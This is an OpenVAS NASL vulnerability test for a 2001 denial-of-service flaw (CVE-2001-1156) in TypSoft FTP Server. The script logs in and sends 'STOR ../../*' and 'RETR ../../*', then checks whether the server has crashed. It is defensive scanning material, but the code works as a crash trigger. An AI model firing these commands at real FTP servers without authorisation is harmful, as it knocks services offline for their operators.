# OpenVAS Vulnerability Test
# $Id: typsoft_ftp_DoS.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: TypSoft FTP STOR/RETR DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID and CAN
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote FTP server crashes when it is sent the command
	RETR ../../*
or
	STOR ../../*

An attacker may use this flaw to make your server crash.";

tag_solution = "upgrade your software or use another FTP service.";

# References:
# Date:  Mon, 08 Oct 2001 14:05:00 +0200
# From: "J. Wagner" <jan.wagner@de.tiscali.com>
# To: bugtraq@securityfocus.com
# CC: "typsoft" <typsoft@altern.org>
# Subject: [ASGUARD-LABS] TYPSoft FTP Server v0.95 STOR/RETR \
#  Denial of Service Vulnerability 

if(description)
{
 script_id(11097);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(3409);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_cve_id("CVE-2001-1156");
 
 name = "TypSoft FTP STOR/RETR DoS";
 script_name(name);
 

 
 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
 
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "FTP";
 script_family(family);
 script_dependencies("find_service.nasl", "secpod_ftp_anonymous.nasl");
 script_require_ports("Services/ftp", 21);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#

include("ftp_func.inc");

cmd[0] = "STOR";
cmd[1] = "RETR";

port = get_kb_item("Services/ftp");
if(! port) port = 21;
if(!get_port_state(port)) exit(0);

login = get_kb_item("ftp/login");
pass  = get_kb_item("ftp/password");
if (!login) login = "ftp"; 
if (!pass) pass = "test@example.org";

soc = open_sock_tcp(port);
if(! soc) exit(0);

if (!ftp_authenticate(socket:soc, user:login, pass:pass)) exit(0);

#if(!r)exit(0);
for (i=0; i<2;i=i+1)
{
 send(socket:soc, data:string(cmd[i], " ../../*\r\n"));
 r = recv_line(socket:soc, length:20000);
 }
ftp_close(socket: soc);

soc = open_sock_tcp(port);
if (!soc) security_message(port);
if (soc) ftp_close(socket: soc);
